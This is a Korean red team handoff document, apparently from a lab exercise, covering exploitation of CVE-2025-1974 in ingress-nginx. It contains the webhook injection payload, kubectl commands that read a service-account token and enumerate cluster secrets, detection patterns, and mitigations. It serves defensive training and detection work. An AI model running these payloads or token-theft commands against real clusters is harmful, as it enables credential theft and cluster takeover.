# Red Team 공격 방식 정리 — Blue/Detection 팀 인수인계

> **작성자**: Red Team (paeyz)  
> **리포**: https://github.com/paeyz/net_kube  
> **환경**: Windows + WSL2 / Minikube / ingress-nginx v1.11.3 (SHA 고정, allow-snippet-annotations=true)

---

## 한 줄 요약

> admission webhook에 인증 없이 접근해 `auth-snippet` 어노테이션으로 nginx 설정을 주입,  
> nginx가 컨트롤러 내부 파일을 파싱하는 과정에서 SA 토큰이 노출되어 클러스터 API를 장악할 수 있다.

---

## 1. 취약점 원리

ingress-nginx는 Ingress 리소스를 생성할 때 admission webhook이 nginx 설정의 유효성을 검사한다.  
이 webhook은 **클러스터 내부 어디서든 인증 없이 POST 요청을 보낼 수 있다.**

```
공격자 파드
  │
  └─ POST https://ingress-nginx-controller-admission.ingress-nginx.svc:443
        Content-Type: application/json
        { "kind": "AdmissionReview", "request": { "object": { "metadata": { "annotations": {
              "nginx.ingress.kubernetes.io/auth-snippet": "include /etc/passwd;"
        }}}}}
```

**핵심 버그**: `configuration-snippet`은 `allow-snippet-annotations=false`로 차단되지만,  
`auth-snippet`은 이 검사를 **완전히 우회**한다 (CVE-2025-1974의 본질).

webhook은 Ingress를 수락하기 전 `nginx -t`(설정 검증)를 실행하는데,  
이 과정에서 주입된 `include <경로>;` 지시어가 실제 파일을 열어 파싱한다.  
파싱 실패 에러가 HTTP 응답으로 돌아오면서 **파일 경로 노출** → **내용 노출** 순서로 진행된다.

---

## 2. 공격 체인 4단계 (T1~T4)

```
T1 파일 열거
  auth-snippet: include <경로>;  →  접근 가능 파일 목록 확보

T2 SA 토큰 추출
  /var/run/secrets/kubernetes.io/serviceaccount/token  →  JWT 획득

T3 Kubernetes API Lateral Movement
  kubectl --token=<JWT> get secrets -A  →  클러스터 내 정보 수집
  → Level 1: 정보 수집 (secrets, pods, configmaps, serviceaccounts)
  → Level 2: 다른 SA 토큰 탈취 (kube-system SA 탐색)
  → Level 3: 권한 확인 (can-i create pods, create clusterrolebindings)

T4 리포트 생성
  results/attack_result_<timestamp>.json / .md  →  증거 파일 저장
```

---

## 3. 실제 페이로드 (코드 수준)

### T1 — 파일 열거 페이로드

```json
{
  "kind": "AdmissionReview",
  "request": {
    "operation": "CREATE",
    "userInfo": { "username": "attacker", "groups": ["system:unauthenticated"] },
    "object": {
      "metadata": {
        "annotations": {
          "nginx.ingress.kubernetes.io/auth-url": "http://127.0.0.1:9999/auth",
          "nginx.ingress.kubernetes.io/auth-snippet": "include /var/run/secrets/kubernetes.io/serviceaccount/token;"
        }
      }
    }
  }
}
```

### 응답 예시 (공격 성공 시)

```
nginx: [emerg] directive is not terminated by ";" in
/var/run/secrets/kubernetes.io/serviceaccount/token:1
```

→ nginx가 실제로 그 파일을 열어 파싱을 시도했다는 증거.  
→ 에러 메시지에 파일 내용이 포함되는 경우 JWT 토큰 직접 노출.

### T2 — SA 토큰 추출 (kubectl exec fallback)

webhook 에러에 토큰이 직접 노출되지 않으면 아래로 fallback:

```bash
kubectl exec -n ingress-nginx <controller-pod> -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### T3 — API Lateral Movement

```bash
# 탈취한 JWT로 클러스터 API 접근
kubectl --token="<JWT>" get secrets -A
kubectl --token="<JWT>" get secrets -n kube-system -o json
kubectl --token="<JWT>" auth can-i create pods -n kube-system
```

---

## 4. 리포 구조 — 관련 파일

```
poc/
  cve_2025_1974_poc.py    # 단계별 PoC (Step 1: 연결확인, Step 2: 차단확인, Step 3: 우회)
  comparison.py           # A/B 비교 시연 (configuration-snippet 차단 vs auth-snippet 우회)
  attack_chain.py         # T1→T4 전체 자동화 메인
  modules/
    file_enum.py          # T1: 12개 경로 열거
    token_extract.py      # T2: webhook 에러 파싱 or kubectl exec
    lateral_move.py       # T3: Level 1~3 API 접근
    reporter.py           # T4: JSON + Markdown 결과 저장
```

---

## 5. 실행 방법

### 환경 준비

```bash
git clone https://github.com/paeyz/net_kube.git
cd net_kube
make cluster-up       # Minikube 시작 (최초: bash scripts/bootstrap_stage2.sh)
make cluster-status   # ingress-nginx v1.11.4 확인
```

### 공격 단계별 실행

```bash
# 각 단계 개별 실행 (port-forward 자동)
make attack-enum      # T1: 접근 가능한 파일 목록 출력
make attack-token     # T2: SA 토큰 JWT 추출
make attack-lateral   # T3: API 접근 범위 확인

# 전체 자동화
make attack-chain
# → results/attack_result_<timestamp>.json 생성
# → results/attack_result_<timestamp>.md  생성
```

### 클러스터 내부 파드로 실행 (현실적 시나리오)

```bash
make docker-build       # 이미지 빌드 (외부 레지스트리 불필요)
make attacker-deploy    # 클러스터 내부 파드 배포
make attacker-logs      # 공격 결과 실시간 확인
make attacker-delete    # 정리
```

---

## 6. 증거 파일 예시

`make attack-chain` 실행 후 `results/` 에 아래 파일이 생성된다.

**JSON** (`attack_result_<ts>.json`):
```json
{
  "timestamp": "20260504T120000Z",
  "target": "https://127.0.0.1:8443",
  "scenario_a_file_enum": {
    "accessible_files": [
      "/var/run/secrets/kubernetes.io/serviceaccount/token",
      "/etc/hosts",
      "/proc/self/environ"
    ],
    "accessible_count": 8,
    "total_probed": 12
  },
  "scenario_b_token": {
    "method": "kubectl_exec",
    "sa_name": "ingress-nginx",
    "namespace": "ingress-nginx",
    "jwt_header": {"alg": "RS256", "kid": "..."}
  },
  "scenario_c_lateral": [
    {"level": 1, "success": true, "details": {"secrets": {"count": 15}}},
    {"level": 2, "success": false},
    {"level": 3, "success": false, "details": {"can_i": {"create pods (kube-system)": "no"}}}
  ]
}
```

---

## 7. 탐지/방어 팀이 알아야 할 IOC

### 공격 트래픽 특징

| 항목 | 값 |
|------|-----|
| 프로토콜 | HTTPS POST |
| 경로 | `/networking/v1/ingresses` |
| 인증 | **없음** (`system:unauthenticated`) |
| 빈도 | T1에서 12회 반복 요청 |

### 악성 어노테이션 패턴

```yaml
# 이 패턴이 Ingress에 포함되면 공격 시도
nginx.ingress.kubernetes.io/auth-snippet: "include ..."
nginx.ingress.kubernetes.io/auth-snippet: "load_module ..."
nginx.ingress.kubernetes.io/auth-snippet: "include /var/run/secrets/..."
nginx.ingress.kubernetes.io/auth-snippet: "include /proc/self/..."
```

### API 접근 패턴 (Lateral Movement)

```
user: system:serviceaccount:ingress-nginx:ingress-nginx
verb: list / get
resource: secrets
namespace: kube-system   ← 정상적으로는 접근 안 해야 함
```

### nginx 비정상 파일 접근

```
proc.name = nginx
fd.name   = /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## 8. 탐지/방어 팀 시작 가이드

### Detection Team

```bash
make detect-setup          # Falco + Gatekeeper + Audit Log 일괄 설치

# 별도 터미널에서 모니터링 시작
make detect-falco-logs     # D1/D3/D4 실시간 탐지
make detect-audit-tail     # D2/D4 Audit Log 스트리밍

# 그다음 Red Team이 make attack-chain 실행 → 탐지 여부 확인
```

탐지 파일 위치:
- `monitoring/falco-rules.yaml` — D1/D3/D4 Falco 룰
- `monitoring/audit-policy.yaml` — D2/D4 Audit Log 정책
- `monitoring/gatekeeper-*.yaml` — D2 OPA/Gatekeeper (warn → deny 전환)

### Blue Team

```bash
# 가장 빠른 방어부터 확인
make defense-m3            # M3: ValidatingAdmissionPolicy
make attack-chain          # → VAP이 막는지 확인 (kubectl apply 경로)

make defense-m4            # M4: RBAC 축소 후 T3 재실행 → 범위 축소 확인
```

방어 파일 위치:
- `defense/m1-webhook-disable.sh` — M1: webhook 비활성화
- `defense/m2-networkpolicy.yaml` — M2: NetworkPolicy (Calico)
- `defense/m3-vap.yaml` — M3: VAP
- `defense/m4-rbac-hardened.yaml` — M4: RBAC 최소 권한

---

## 9. 패치 후 동작 (참고)

ingress-nginx v1.11.5 이상에서는 `auth-snippet`도 `allow-snippet-annotations` 검사를 받는다.

```bash
# 패치 버전 테스트
# helm upgrade로 v1.11.5로 올린 후
make poc-step3    # → allowed=false (차단 확인)
```

---

## 10. 참고

- CVE 원문: https://github.com/kubernetes/ingress-nginx/issues/12375
- Wiz Research: https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
- 전체 인수인계 보고서: `docs/attack_report.md`
- 실행 전체 가이드: `SETUP.md`
